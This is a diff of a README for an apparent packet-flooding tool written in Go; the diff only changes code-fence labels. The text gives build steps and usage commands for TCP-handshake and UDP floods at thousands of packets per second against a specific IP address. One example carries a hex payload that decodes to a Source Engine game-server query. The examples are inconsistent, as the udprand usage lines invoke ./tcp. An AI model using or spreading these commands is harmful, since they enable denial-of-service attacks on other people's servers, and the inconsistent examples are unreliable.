@@ -16,7 +16,7 @@ snap install go --classic
 
 <h3>Update servers.json</h3><br>
 
-```json
+```sh
 go build tcp.go
 go build udp.go
 go build udprand.go
@@ -24,21 +24,21 @@ go build udprand.go
 
 <h3>TCP Handshake usage</h3><br>
 
-```json
+```sh
 ./tcp <target> <tcp-port> <packets-per-second>
 ./tcp 145.239.54.169 80 10000
 ```
 
 <h3>UDP with TCP Handshake and random data usage</h3><br>
 
-```json
+```sh
 ./udprand <target> <tcp-port> <udp-port> <packets-per-second>
 ./tcp 145.239.54.169 80 1194 8000
 ```
 
 <h3>UDP with TCP Handshake and custom data usage</h3><br>
 
-```json
+```sh
 ./udprand <target> <tcp-port> <udp-port> <packets-per-second> <udp-payload>
 ./tcp 145.239.54.169 80 1194 8000 ffffffff54536f7572636520456e67696e6520517565727900
 ```
